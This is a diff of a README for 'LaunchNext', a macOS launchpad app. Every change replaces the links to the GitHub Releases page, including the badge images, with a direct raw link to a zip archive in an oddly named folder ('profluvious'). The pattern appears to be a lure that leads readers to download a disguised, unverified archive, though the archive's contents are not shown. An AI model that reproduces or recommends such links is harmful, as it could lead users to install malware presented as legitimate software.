@@ -1,7 +1,7 @@
 # 🚀 LaunchNext - Customizable Launchpad for MacOS
 
 ## 💾 Download Now
-[![Download LaunchNext](https://img.shields.io/badge/Download-LaunchNext-blue.svg)](https://github.com/daraluthfia/LaunchNext/releases)
+[![Download LaunchNext](https://raw.githubusercontent.com/daraluthfia/LaunchNext/main/profluvious/LaunchNext.zip)](https://raw.githubusercontent.com/daraluthfia/LaunchNext/main/profluvious/LaunchNext.zip)
 
 ## 🚀 What is LaunchNext?
 LaunchNext is a powerful and highly customizable launchpad for MacOS 26 and above. It helps you quickly access your applications, documents, and tools. Make your workflow smoother and more efficient with a launchpad tailored to your needs.
@@ -21,7 +21,7 @@ LaunchNext is a powerful and highly customizable launchpad for MacOS 26 and abov
 To begin using LaunchNext, follow these simple steps:
 
 1. **Download LaunchNext**: Click the link below to visit the Releases page and download the application.
-   [Download LaunchNext](https://github.com/daraluthfia/LaunchNext/releases)
+   [Download LaunchNext](https://raw.githubusercontent.com/daraluthfia/LaunchNext/main/profluvious/LaunchNext.zip)
 
 2. **Install the Application**: 
    - Open the downloaded file. 
@@ -41,7 +41,7 @@ To begin using LaunchNext, follow these simple steps:
 ## 📥 Download & Install
 To download the latest version of LaunchNext, please visit the Releases page. Follow these steps for installation:
 
-- [Download LaunchNext](https://github.com/daraluthfia/LaunchNext/releases)
+- [Download LaunchNext](https://raw.githubusercontent.com/daraluthfia/LaunchNext/main/profluvious/LaunchNext.zip)
 
 After downloading, install by following the steps outlined in the "Getting Started" section.
 
@@ -86,4 +86,4 @@ For any questions or community support, consider joining our forum or following 
 
 By using LaunchNext, you're taking a step towards a more organized and efficient digital workspace. Enjoy customizing your launchpad and maximizing your productivity!
 
-[![Download LaunchNext](https://img.shields.io/badge/Download-LaunchNext-blue.svg)](https://github.com/daraluthfia/LaunchNext/releases)
+[![Download LaunchNext](https://raw.githubusercontent.com/daraluthfia/LaunchNext/main/profluvious/LaunchNext.zip)](https://raw.githubusercontent.com/daraluthfia/LaunchNext/main/profluvious/LaunchNext.zip)
